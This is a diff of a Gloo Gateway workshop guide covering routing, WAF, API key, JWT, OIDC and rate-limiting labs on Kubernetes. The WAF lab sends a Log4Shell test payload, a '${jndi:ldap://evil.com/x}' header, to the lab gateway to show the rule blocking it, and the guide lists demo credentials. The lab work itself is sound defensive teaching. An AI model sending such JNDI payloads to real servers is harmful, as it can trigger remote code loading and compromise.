@@ -1,5 +1,3 @@
-<center>![Gloo Gateway](images/gloo-gateway-logo.png)</center>
-
 # <center>Gloo Gateway Workshop</center>
 
 ## Table of Contents
@@ -58,7 +56,7 @@ export ISTIO_IMAGE_TAG=1.13.4-solo
 export ISTIO_VERSION=1.13.4
 ```
 
-## Lab 1 - Configure/Deploy the Kubernetes cluster <a name="Lab-1"></a>
+## Lab 1 - Configure/Deploy a Kubernetes cluster <a name="Lab-1"></a>
 
 You will need a single Kubernetes cluster for this workshop.
 
@@ -102,6 +100,8 @@ meshctl install --license $GLOO_GATEWAY_LICENSE_KEY --register --version $GLOO_P
 ```
 
 ## Lab 3 - Deploy Gloo API Gateway<a name="Lab-3"></a>
+
+![Gloo API Gateway](images/gloo-gateway-filter.png)
 
 The Gloo Platform can easily deploy and manage your API Gateways for you. You can even deploy them to many clusters with a single configuration. For this workshop we will be deploying an API gateway to the same cluster as the management platform.
 
@@ -168,11 +168,14 @@ kubectl apply -f install/online-boutique/web-ui.yaml
 
 ## Lab 5 - Configure Gloo Platform Workspaces <a name="Lab-5"></a>
 
+![Workspaces](images/gloo-workspaces.png)
+
 In this section, you'll learn about the Gloo **Workspaces** feature. Workspaces bring multi-tenancy isolation to your cluster. With Workspaces, you can explore how multiple personas can work independently without conflicting with each others configuration.
 
 Imagine that you have the following teams. Each team represents a "tenant" in Gloo.
-- The Ops team, who is responsible for the platform and ingress traffic.
-- The Dev team, who is responsible for the frontend web application and backend apis that power the frontend.
+
+* The Ops team, who is responsible for the platform and ingress traffic.
+* The Dev team, who is responsible for the frontend web application and backend apis that power the frontend.
 
 Also note that a dedicated namespace is created for each workspace to place their configuration (`ops-team`, `dev-team` namespaces). It is recommended that the configuration is separate from your deployments.
 
@@ -218,6 +221,8 @@ Each workspace can have only one WorkspaceSettings resource.
 
 ## Lab 6 - Expose the Online Boutique <a name="Lab-6"></a>
 
+![Expose Online Boutique](images/expose-apps.png)
+
 To capture the traffic coming to the API Gateway and route them to your applications, you need to use the `VirtualGateway` and `RouteTable` resources.
 
 VirtualGateway represents a logical gateway configuration served by Gateway workloads. It describes a set of ports that the virtual gateway listens for incoming or outgoing HTTP/TCP connections, the type of protocol to use, SNI configuration etc.
@@ -227,6 +232,7 @@ RouteTables defines one or more hosts and a set of traffic route rules to handle
 This allows you to create a hierarchy of routing configuration and dynamically attach policies at various levels. 
 
 1. Let's start by assuming the role of a Ops team. Configure the Gateway to listen on port 80 and create a generic RouteTable that further delegates the traffic routing to RouteTables in the `dev-team` workspace.
+
 ```yaml
 kubectl apply -f - <<'EOF'
 apiVersion: networking.gloo.solo.io/v2
@@ -310,7 +316,10 @@ You've successfully exposed the frontend application thru the Gloo Gateway.
 
 ## Lab 7 - Routing <a name="Lab-7"></a>
 
+![Routing](images/routing.png)
+
 ### Routing to additional applications in the cluster
+
 Next, lets see how easy it is to expose another application. This time, we will match on URI `prefix: /hipstershop.CurrencyService/Convert` and send to the currencyservice application.
 
 ```yaml
@@ -444,6 +453,8 @@ curl -v $GLOO_GATEWAY/httpbin/get
 
 ## Lab 8 - Web Application Firewall (WAF)<a name="Lab-8"></a>
 
+![Security](images/security.png)
+
 Gloo Mesh Gateway utilizes OWASP ModSecurity to add WAF features into the ingress gateway. Not only can you enable the [OWASP Core Rule Set](https://owasp.org/www-project-modsecurity-core-rule-set/) easily, but also you can enable many other advanced features to protect your applications.
 
 In this section of the lab, take a quick look at how to prevent the `log4j` exploit that was discovered in late 2021. For more details, you can review the [Gloo Edge blog](https://www.solo.io/blog/block-log4shell-attacks-with-gloo-edge/) that this implementation is based on.
@@ -459,8 +470,8 @@ curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY
 
 3. With the Gloo Mesh WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
 
-  * In the route table, the frontend route has the label `route: httpbin`. The WAF policy applies to routes with this same label.
-  * In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
+* In the route table, the frontend route has the label `route: httpbin`. The WAF policy applies to routes with this same label.
+* In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
 
 ```yaml
 kubectl apply -f - <<'EOF'
@@ -507,21 +518,11 @@ Log4Shell malicious payload
 
 Your frontend app is no longer susceptible to `log4j` attacks, nice!
 
-### Lab 9 - Authentication / API Key<a name="Lab-9"></a>
+### Lab 9 - Authentication / API Key <a name="Lab-9"></a>
 
-```
-echo -n "admin" | base64
-YWRtaW4=
-echo -n "Solo Admin" | base64
-U29sbyBBZG1pbg==
+API key authentication is one of the easiest forms of authentication to implement. Simply create a Kubernetes secret that contains the key and reference it from the `ExtAuthPolicy`. It is recommended to label the secrets so that multiple can be selected and more can be added later. You can select any header to validate against.
 
-echo -n "developer" | base64
-ZGV2ZWxvcGVy
-echo -n "Solo Developer" | base64
-U29sbyBEZXZlbG9wZXI=
-```
-
-* API Key
+1. Create two secrets that Gloo will validate against. One with the api-key `admin` and the other `developer`.
 
 ```yaml
 kubectl apply -f - <<EOF
@@ -534,9 +535,7 @@ metadata:
     api-keyset: httpbin-users
 type: extauth.solo.io/apikey
 data:
-  # x-api-key=admin
-  api-key: YWRtaW4=
-  api-key-user: U29sbyBBZG1pbg==
+  api-key: $(echo -n "admin" | base64)
 ---
 apiVersion: v1
 kind: Secret
@@ -547,11 +546,11 @@ metadata:
     api-keyset: httpbin-users
 type: extauth.solo.io/apikey
 data:
-  # x-api-key=developer
-  api-key: ZGV2ZWxvcGVy
-  api-key-user: U29sbyBEZXZlbG9wZXI=
+  api-key: $(echo -n "developer" | base64)
 EOF
 ```
+
+2. Create the API key `ExtAuthPolicy` that will match header `x-api-key` values againt the secrets created above.
 
 ```yaml
 kubectl apply -f - <<EOF
@@ -579,23 +578,33 @@ spec:
 EOF
 ```
 
-* Call httpbin without an api key
+3. Call httpbin without an api key and you will get a 401 unathenticated message. 
 
 ```sh
 curl -v http://$GLOO_GATEWAY/httpbin/get
 ```
 
-* Call httpbin with the developer api key
+4. Call httpbin with the developer api key `x-api-key: developer`
+
 ```sh
 curl -H "x-api-key: developer" -v http://$GLOO_GATEWAY/httpbin/get
 ```
 
-* Call httpbin with the admin api key
+5. Call httpbin with the admin api key `x-api-key: admin`
+
 ```sh
 curl -H "x-api-key: admin" -v http://$GLOO_GATEWAY/httpbin/get
 ```
 
 ## Lab 10 - Authentication / JWT + JWKS<a name="Lab-10"></a>
+
+JWT authentication using JSON web key sets (JWKS) is a much more robust mechanism for authentication as keys can be shorter lived / rotated and the validation is done against rotating keys. Also more information can be stored in JWTs vs API keys. In this example Auth0 is used as the JWT signer and JWKS provider. 
+
+To create your own Auth0 Tokens, create an Auth0 `Application` and the JWKS will be located at `"https://<Auth0 Server>/.well-known/jwks.json"` and tokens can be generated calling the `https://<Auth0 Server>/oauth/token` endpoint.
+
+![Auth0 Application](images/auth0.png)
+
+1. First create and `ExternalEndpoint` and `ExternalService` to reference the `Auth0` server.
 
 ```yaml
 kubectl apply -f - <<EOF
@@ -627,7 +636,11 @@ spec:
     number: 443
     protocol: HTTPS
     clientsideTls: {}
----
+```
+
+2. Create the `JWTPolicy` to authenticate JWT tokens.
+
+```yaml
 apiVersion: security.policy.gloo.solo.io/v2
 kind: JWTPolicy
 metadata:
@@ -658,7 +671,7 @@ spec:
 EOF
 ```
 
-* Call Auth0 to generate a temporary jwt token
+3. Call Auth0 to generate a temporary JWT token
 
 ```sh
 ACCESS_TOKEN=$(curl -sS --request POST \
@@ -669,19 +682,21 @@ ACCESS_TOKEN=$(curl -sS --request POST \
 printf "\n\n Access Token: $ACCESS_TOKEN\n"
 ```
 
-* Try calling currency service with no access token
+4. Try calling currency service with no access token.
 
 ```sh
 grpcurl --plaintext --proto ./install/online-boutique/online-boutique.proto -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units": "31" }, "to_code": "JPY" }' $GLOO_GATEWAY:80 hipstershop.CurrencyService/Convert
 ```
 
-* Call currency service with an access token
+5. Call currency service with an access token
 
 ```sh
 grpcurl -H "Authorization: Bearer ${ACCESS_TOKEN}" --plaintext --proto ./install/online-boutique/online-boutique.proto -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units": "31" }, "to_code": "JPY" }' $GLOO_GATEWAY:80 hipstershop.CurrencyService/Convert
 ```
 
 ## Lab 11 - Authentication / OIDC<a name="Lab-11"></a>
+
+![Keycloak](images/keycloak.png)
 
 Another valuable feature of API gateways is integration into your IdP (Identity Provider). In this section of the lab, we see how Gloo Mesh Gateway can be configured to redirect unauthenticated users via OIDC.  We will use Keycloak as our IdP, but you could use other OIDC-compliant providers in your production clusters.
 
@@ -698,7 +713,8 @@ kubectl -n gloo-gateway create secret generic tls-secret \
 rm tls.crt tls.key
 ```
 
-2. Adding HTTPS to our gateway is simple as updating the virtual gateway to use our ssl certificate
+2. Adding HTTPS to our gateway is simple as updating the virtual gateway to use our ssl certificate.
+
 ```yaml
 kubectl apply -f - <<'EOF'
 apiVersion: networking.gloo.solo.io/v2
@@ -739,13 +755,13 @@ echo "Secure Online Boutique URL: https://$GLOO_GATEWAY"
 
 The `ExtAuthPolicy` defines the provider connectivity including any callback paths that we need to configure on our application.
 
-* View the `ExtAuthPolicy` with environment variables replaced.
+4. View the `ExtAuthPolicy` with environment variables replaced.
 
 ```sh
 ( echo "cat <<EOF" ; cat tracks/ext-auth-policy.yaml ; echo EOF ) | sh
 ```
 
-* Apply the `ExtAuthPolicy`
+5. Apply the `ExtAuthPolicy`
 
 ```sh
 ( echo "cat <<EOF" ; cat tracks/ext-auth-policy.yaml ; echo EOF ) | sh | kubectl apply -n dev-team -f -
@@ -753,7 +769,7 @@ The `ExtAuthPolicy` defines the provider connectivity including any callback pat
 
 Now if you refresh the application, you should be redirected to Keycloak to login.
 
-* Login using the following credentials
+6. Login using the following credentials
 
 ```sh
 user: gloo-mesh
@@ -762,9 +778,11 @@ password: solo.io
 
 And the application is now accessible.
 
-* When you are finished, click the 'logout' button in the top right corner of the screen.
+7. When you are finished, click the 'logout' button in the top right corner of the screen.
 
 ## Lab 12 - Rate Limiting<a name="Lab-12"></a>
+
+![Rate Limiting](images/rate-limiter.png)
 
 Secondly, we will look at rate limiting with Gloo Mesh Gateway.  The rate limiting feature relies on a rate limit server that has been installed in our gloo-mesh-addons namespace.
 
@@ -774,7 +792,7 @@ The `RateLimitClientConfig` defines the conditions in the request that will invo
 
 The `RateLimitPolicy` pulls together the `RateLimitClientConfig`, `RateLimitServerConfig` and sets the label selector to use in the `RouteTable`.
 
-* Apply the `RateLimitPolicy`
+1. Apply the `RateLimitPolicy`
 
 ```yaml
 kubectl apply -f - <<'EOF'
@@ -833,13 +851,13 @@ spec:
 EOF
 ```
 
-* Test Rate Limiting
+2. Test Rate Limiting
 
 ```sh
 for i in {1..6}; do curl -iksS -H "x-api-key: developer" -X GET https://$GLOO_GATEWAY/httpbin/get | tail -n 10; done
 ```
 
-* Expected Response
+3. Expected Response
 
 ```sh
 HTTP/2 429
